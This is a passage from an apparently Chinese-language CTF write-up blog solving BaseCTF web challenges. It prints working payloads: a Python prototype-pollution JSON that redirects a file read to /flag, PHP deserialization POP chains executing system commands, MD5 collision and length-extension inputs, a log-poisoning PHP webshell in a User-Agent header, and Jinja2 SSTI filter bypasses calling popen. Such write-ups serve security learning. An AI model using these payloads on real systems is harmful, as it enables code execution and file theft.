class="built_in">open</span>(<span class="string">&#x27;/static/index.html&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Read</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(__file__, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;J1ngHong说：你想read flag吗？</span></span><br><span class="line"><span class="string">那么圣钥之光必将阻止你！</span></span><br><span class="line"><span class="string">但是小小的源码没事，因为你也读不到flag(乐)</span></span><br><span class="line"><span class="string"><span class="subst">&#123;file&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pollute&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollution</span>():</span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>有merge合并函数，可以利用污染<br>
污染的地方在/pollute，污染什么呢？我们进入这个read界面时返回的是Read()当中的东西，在这里面有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(__file__, encoding=&quot;utf-8&quot;).read()</span><br></pre></td></tr></table></figure>
<p>那我们把</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__file__</span><br></pre></td></tr></table></figure>
<p>改成/flag就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;__file__&quot;:&quot;/flag&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>记得Content-Type: application/json并用bp</p>
<h1>你听不到我的声音</h1>
<p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我要执行 shell 指令啦! 诶? 他的输出是什么? 为什么不给我?</span><br></pre></td></tr></table></figure>
<p>输入没有回显，有一种办法，把命令执行后的内容输入到文件当中</p>
<p>ls /&gt;1.txt</p>
<p>cat /flag /&gt;&gt;1.txt</p>
<h1>ez_ser</h1>
<p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单的反序列化入门，喵喵喵</span><br></pre></td></tr></table></figure>
<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class re&#123;</span><br><span class="line">    public $chu0;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(!isset($this-&gt;chu0))&#123;</span><br><span class="line">            return &quot;I can not believes!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;chu0-&gt;$nononono;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public $kw;</span><br><span class="line">    public $dt;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;lalalla&quot;.$this-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        echo &quot;ALL Done!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public $dusk;</span><br><span class="line">    public $over;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        if($this-&gt;dusk != &quot;gods&quot;)&#123;</span><br><span class="line">            echo &quot;什么，你竟敢不认可?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;over-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public $nothing;</span><br><span class="line">    public $flag;</span><br><span class="line"></span><br><span class="line">    public function getflag() &#123;</span><br><span class="line">        eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Crypto &#123;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;happy happy happy!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getflag() &#123;</span><br><span class="line">        echo &quot;you are over!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser = $_GET[&#x27;ser&#x27;];</span><br><span class="line">unserialize($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>我们最终的目的是拿到eval(“system(‘cat /flag’);”);</p>
<p>第一步：找反序列化漏洞的开始的地方	可以是wakeup、destruct和construct魔法函数。就在源码的web类当中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new web();</span><br></pre></td></tr></table></figure>
<p>第二：在wakeup当中有echo “lalalla”.$this-&gt;kw;这样的操作，将&quot;lalalla&quot;和kw的属性的值进行拼接，然后输出。但是输出时他会检测是否有tostring魔术方法，如果有，则返回tostring的返回值。那么在这个wakeup魔法方法就会进去tostring当中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a-&gt;kw-&gt;new re();</span><br></pre></td></tr></table></figure>
<p>第三：在tostring当中，有$this-&gt;chu0-&gt;$nononono;这样的操作，其访问了一个不存在的$nononono属性，但是这里并没有定义这个属性。所以这里会掉用get魔术方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a-&gt;kw-&gt;chu0-&gt;new pwn();</span><br></pre></td></tr></table></figure>
<p>第四：这里的$this-&gt;over-&gt;getflag();操作当中，我们可以给over赋值为Misc。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a-&gt;kw-&gt;chu0-&gt;over-&gt;&quot;gods&quot;;</span><br><span class="line">$a-&gt;kw-&gt;chu0-&gt;over-&gt;new Misc();</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new web();</span><br><span class="line">$a-&gt;kw=new re();</span><br><span class="line">$a-&gt;kw-&gt;chu0=new pwn();</span><br><span class="line">$a-&gt;kw-&gt;chu0-&gt;dusk=&quot;gods&quot;;</span><br><span class="line">$a-&gt;kw-&gt;chu0-&gt;over=new Misc();</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其实这里两个只要第二个就行了</span><br><span class="line">$a-&gt;kw-&gt;chu0-&gt;dusk=&quot;gods&quot;;</span><br><span class="line">$a-&gt;kw-&gt;chu0-&gt;over=new Misc();</span><br><span class="line">因为在源码当中dusk无论是否是gods，其都会执行$this-&gt;over-&gt;getflag();</span><br></pre></td></tr></table></figure>
<p>其中的&quot;-&gt;&quot;可以理解为把其他类赋值给一个属性，相当于把他包括了进来。这样的多个-&gt;是一个链代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> (web 类的实例)</span><br><span class="line">   |</span><br><span class="line">   +---&gt; <span class="variable">$kw</span> (属性) = <span class="keyword">new</span> <span class="title function_ invoke__">re</span>() (re 类的实例)</span><br><span class="line">         |</span><br><span class="line">         +---&gt; <span class="variable">$chu0</span> (属性) = <span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>() (pwn 类的实例)</span><br><span class="line">               |</span><br><span class="line">               +---&gt; <span class="variable">$over</span> (属性) = <span class="keyword">new</span> <span class="title class_">Misc</span>() (Misc 类的实例)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ser=O:3:&quot;web&quot;:2:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;s:4:&quot;gods&quot;;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:2:&#123;s:7:&quot;nothing&quot;;N;s:4:&quot;flag&quot;;N;&#125;&#125;&#125;s:2:&quot;dt&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>另一种构造方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class re&#123;</span><br><span class="line">    public $chu0;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $s = new pwn();</span><br><span class="line">        $this-&gt;chu0=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(!isset($this-&gt;chu0))&#123;</span><br><span class="line">            return &quot;I can not believes!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;chu0-&gt;$nononono;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public $kw;</span><br><span class="line">    public $dt;</span><br><span class="line">        public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $s = new re();</span><br><span class="line">        $this-&gt;kw=$s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;lalalla&quot;.$this-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        echo &quot;ALL Done!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public $dusk = &quot;gods&quot;;</span><br><span class="line">    public $over;</span><br><span class="line">        public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $s = new Misc();</span><br><span class="line">        $this-&gt;over=$s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        if($this-&gt;dusk != &quot;gods&quot;)&#123;</span><br><span class="line">            echo &quot;浠€涔堬紝浣犵珶鏁笉璁ゅ彲?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;over-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public $nothing;</span><br><span class="line">    public $flag;</span><br><span class="line"></span><br><span class="line">    public function getflag() &#123;</span><br><span class="line">        eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new web();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
<h1>Really EZ POP</h1>
<p>题目信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你已经学会反序列化了，接下来尝试手动构造 POP 链吧！</span><br><span class="line"></span><br><span class="line">请注意 PHP 版本为 5.6.40, 反序列化不会忽略成员变量可访问性</span><br><span class="line"></span><br><span class="line">!!不要使用!! FireFox 的 Hackbar 发送 Payload, 可能你输入是正确的, 但是没有回显</span><br></pre></td></tr></table></figure>
<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;echo 123;&#x27;;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Shark says:&#x27; . $this-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_POST[&#x27;nature&#x27;]) &#123;</span><br><span class="line">    $nature = unserialize($_POST[&#x27;nature&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>nature-&gt;sea-&gt;shark-&gt;sink，然后给cmd赋值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new Nature();</span><br><span class="line">$a-&gt;sea=new Sea();</span><br><span class="line">$a-&gt;sea-&gt;animal=new Shark();</span><br><span class="line">$a-&gt;sea-&gt;animal-&gt;Setword(new Sink());</span><br></pre></td></tr></table></figure>
<p>这里有一个东西，就是Setword，这个是我们自己编写然后塞进去的。因为我们无法属性为private的word，我们通过Setword进行修改，将其放在private $word = ‘Hello, World!’;下面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function Setword($setword)</span><br><span class="line">	&#123;</span><br><span class="line">        $this-&gt;word =$setword;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>或者我们创建一个construct魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;word=new Sink;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最后一定要进行urlendoce，因为这里我吃亏了…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nature=O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A20%3A%22system%28%22tac+%2Fflag%22%29%3B%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
<p>题目信息当中：请注意 PHP 版本为 5.6.40, 反序列化不会忽略成员变量可访问性。也就是我们在序列化的过程中不能修改变量的public/private属性</p>
<ol>
<li><strong>PHP 5.6.25 之前的版本</strong>：
<ul>
<li>在这些版本中，反序列化时不会严格检查成员变量的访问性，可能会允许对 <code>private</code> 和 <code>protected</code> 变量的直接赋值。</li>
</ul>
</li>
<li><strong>PHP 7.0.10 之前的版本</strong>：
<ul>
<li>同样存在类似问题，反序列化时可能会忽略成员变量的访问性限制。</li>
</ul>
</li>
<li><strong>PHP 7.1 及更高版本</strong>：
<ul>
<li>从 PHP 7.1 开始，反序列化时会更加严格地检查成员变量的访问性。然而，在某些情况下，如果序列化字符串中的字段被错误地声明为 <code>public</code>，可能会绕过访问性限制。</li>
</ul>
</li>
</ol>
<h1>所以你说你懂 MD5?</h1>
<p>题目信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所以你说你懂 MD5?</span><br><span class="line"></span><br><span class="line">可以了解一下 MD5 长度拓展攻击</span><br></pre></td></tr></table></figure>
<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// 所以你说你懂 MD5 了?</span><br><span class="line"></span><br><span class="line">$apple = $_POST[&#x27;apple&#x27;];</span><br><span class="line">$banana = $_POST[&#x27;banana&#x27;];</span><br><span class="line">if (!($apple !== $banana &amp;&amp; md5($apple) === md5($banana))) &#123;</span><br><span class="line">    die(&#x27;加强难度就不会了?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 什么? 你绕过去了?</span><br><span class="line">// 加大剂量!</span><br><span class="line">// 我要让他成为 string</span><br><span class="line">$apple = (string)$_POST[&#x27;appple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;bananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) == md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;难吗?不难!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你还是绕过去了?</span><br><span class="line">// 哦哦哦, 我少了一个等于号</span><br><span class="line">$apple = (string)$_POST[&#x27;apppple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;banananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你以为这就结束了</span><br><span class="line">if (!isset($_SESSION[&#x27;random&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;random&#x27;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你想看到 random 的值吗?</span><br><span class="line">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="line">$random = $_SESSION[&#x27;random&#x27;];</span><br><span class="line">echo md5($random);</span><br><span class="line">echo &#x27;&lt;br /&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$name = $_POST[&#x27;name&#x27;] ?? &#x27;user&#x27;;</span><br><span class="line"></span><br><span class="line">// check if name ends with &#x27;admin&#x27;</span><br><span class="line">if (substr($name, -5) !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    die(&#x27;不是管理员也来凑热闹?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$md5 = $_POST[&#x27;md5&#x27;];</span><br><span class="line">if (md5($random . $name) !== $md5) &#123;</span><br><span class="line">    die(&#x27;伪造? NO NO NO!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 认输了, 看样子你真的很懂 MD5</span><br><span class="line">// 那 flag 就给你吧</span><br><span class="line">echo &quot;看样子你真的很懂 MD5&quot;;</span><br><span class="line">echo file_get_contents(&#x27;/flag&#x27;); 加强难度就不会了?</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$apple = $_POST[&#x27;apple&#x27;];</span><br><span class="line">$banana = $_POST[&#x27;banana&#x27;];</span><br><span class="line">if (!($apple !== $banana &amp;&amp; md5($apple) === md5($banana))) &#123;</span><br><span class="line">    die(&#x27;加强难度就不会了?&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个很好绕过，只有强比较，可以用数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$apple = (string)$_POST[&#x27;appple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;bananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) == md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;难吗?不难!&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个使用了弱比较，用md5碰撞就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$apple = (string)$_POST[&#x27;apppple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;banananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) &#123;</span><br><span class="line">  die(&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个在强比较的基础上又加了String转换，这里要用到md5强碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!isset($_SESSION[&#x27;random&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;random&#x27;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里相当于96位的字符串	即密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$random = $_SESSION[&#x27;random&#x27;];</span><br><span class="line">echo md5($random);</span><br><span class="line">echo &#x27;&lt;br /&gt;&#x27;;</span><br></pre></td></tr></table></figure>
<p>这里将md5加密后的random给我们了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$name = $_POST[&#x27;name&#x27;] ?? &#x27;user&#x27;;</span><br></pre></td></tr></table></figure>
<p>空合并运算符<code>??</code>是PHP 7引入的一个语法糖，用于简化默认值的赋值操作。它的语法是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$value</span> ?? <span class="variable">$default</span>;</span><br></pre></td></tr></table></figure>
<p>它的作用是：</p>
<p>​	如果<code>$value</code>存在且不为<code>null</code>，则<code>$result</code>的值为<code>$value</code>。</p>
<p>​	如果<code>$value</code>不存在或为<code>null</code>，则<code>$result</code>的值为<code>$default</code>。</p>
<p>那么在这道题目当中，无论你传进去的name是什么，都会变成user</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (substr($name, -5) !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    die(&#x27;不是管理员也来凑热闹?&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里name的最后5个字符必须是admin</p>
<p>我们先传进去一个name，拿到md5后的random，</p>
<p>再通过hash-ext-attack-master</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250318135048790.png" alt="image-20250318135048790"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin</span><br><span class="line">834390dc714bf75dbd5dac9992142106</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apple%5B%5D=1a&amp;banana%5B%5D=2&amp;appple=s1502113478a&amp;bananana=s1885207154a&amp;apppple=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;banananana=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2&amp;name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin&amp;md5=834390dc714bf75dbd5dac9992142106</span><br></pre></td></tr></table></figure>
<p>迷迷糊糊的…</p>
<h1>滤个不停</h1>
<p>题目信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤这么多还怎么玩！等等....不对劲</span><br></pre></td></tr></table></figure>
<p>题目过滤挺多的，但这道题不是用伪协议</p>
<p>用日志包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=/var/log/nginx/access.log</span><br><span class="line">User_Agent: &lt;?php sevanxro;system(&#x27;cat /flag&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<h1>复读机</h1>
<p>题目信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一位复读机发明了一个复读机来复读flag</span><br></pre></td></tr></table></figure>
<p>这题简称无敌了</p>
<p>有过滤，检测一下特俗字符</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250318202948614.png" alt="image-20250318202948614"></p>
<p>还有一个下划线_和一些class、subclasses…</p>
<p>通常我们的思路是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>但这里需要绕过</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;-&gt;&#123;%%&#125;</span><br><span class="line"><span class="string">&quot;&quot;</span>-&gt;<span class="string">&#x27;&#x27;</span></span><br><span class="line">.-&gt;[]</span><br><span class="line">_-&gt;<span class="string">&#x27;_&#x27;</span></span><br><span class="line">单词 -&gt; <span class="string">&#x27;cla&#x27;</span><span class="string">&#x27;ss&#x27;</span></span><br><span class="line">subclasses后面的小括号阔在[]外面</span><br><span class="line">过滤了斜杠，那么我们利用<span class="built_in">chr</span>构造一个</span><br><span class="line"></span><br><span class="line">python能将<span class="built_in">chr</span>(<span class="number">47</span>)转化成/</span><br><span class="line">builtins是Python解释器在启动的时候会首先加载内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身（注意区分函数名称和函数对象的区别）,其中有<span class="built_in">int</span>等内置函数，也有<span class="built_in">chr</span></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">chr</span>= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>] [<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>] [<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_bui&#x27;</span><span class="string">&#x27;ltins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]%&#125; &#123;% <span class="built_in">set</span> cmd=<span class="string">&#x27;cat &#x27;</span>~<span class="built_in">chr</span>(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> %&#125;</span><br><span class="line">在 Jinja2 模板中，~ 是字符串拼接运算符。</span><br><span class="line">ssti漏洞是jinja2引入&#123;&#123;&#125;&#125;时出现并运行的结果</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=<span class="string">&#x27;cat &#x27;</span>~<span class="string">&#x27;%c&#x27;</span>%(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> 